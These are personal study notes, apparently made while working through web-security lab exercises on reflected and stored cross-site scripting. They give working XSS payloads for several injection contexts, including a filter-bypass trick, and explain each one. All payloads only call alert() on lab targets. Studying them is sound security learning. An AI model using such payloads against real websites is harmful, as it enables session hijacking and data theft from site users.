# Reflected XSS
- The input we provide is reflected somewhere on the page and if it's not properly filtered we can add HTML content to execute JS functions
```
<script>alert(1)</script>
```
#### Break out of javascript string and execute XSS payload
- Okay this is interesting
![[Pasted image 20220203175418.png]]
- why is there a document.write ??
- anyway, the quotes are getting escaped easily with a backslash so we can use \</script\> to exit out of the script blog of the webpage and start our own script
- The working payload: 
```
</script><script>alert("hello")</script>
```
#### Break out of encoded angle brackets
```
'-alert(1)-'
```
### Break out of javascript strings 
```
'-alert(document.domain)-'  
';alert(document.domain)//
```
**Why this works:**
`';alert(document.domain)//`
gets converted to:
`\';alert(document.domain)//`

`\';alert(document.domain)//`
which gets converted to:
`\\';alert(document.domain)//`
#### Break out of javascript where angle brackets and double are HTML encoded and single quotes are escaped
```
\'-alert(1)- //
```
- The double slashes at the end are probably to comment out the rest of the javascript in that line
### javascript injection in URL using XSS where some characters are blocked
- The payload: 
```
[https://target.website/post?postId=5](https://your-lab-id.web-security-academy.net/post?postId=5&'},x=x=>{throw/\*\*/onerror=alert,1337},toString=x,window+'',{x:'
```
- **Why this works:**
	-   `&`: appends a new parameter to leave the `postId` parameter untouched.
	-   `'}`: breaks out of `body:'/post?postId=1'}`. The code should now look like `fetch('/analytics', {method:'post',body:'/post?postId=5&'}'}).finally(_ => window.location = '/')` : This code/url was exposed when I hovered over **Back to blog** link in the blog post page.
	-   `,x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',`: Is a fancy way to call `alert(1337)` ([Breaking out of a JavaScript string](https://portswigger.net/web-security/cross-site-scripting/contexts)). It basically overwrites the `toString` method and triggers it. `,toString=alert(1337),window+'',` doesn't work, since `(` and `)` are blocked. The `,` separation is important to not break the JavaScript.
	-   `{x:'`: is supplied to not break the JavaScript.
### Break out of Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
- Template literals are used to display the search query: 
![[Pasted image 20220204152942.png]]
- The payload: 
```
${alert(1)}
```
# Stored XSS
- The input we provide is stored somewhere on the server and is triggered only when someone views the content containing our input
### Break out of Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
The payload: 
```
http://foo?&apos;-alert(1)-&apos
```
**Why this works:**
	- It's being inserted into the 'website' input field, which can be triggered by clicking on the name of the author, which has an onclick attribute: 
	```
	onclick=...some javascript...('http://website.com/')
	```
	- So instead of a proper website name, the first `&apos` in the payload terminates the string and then the rest of it is executed as a separate javascript function.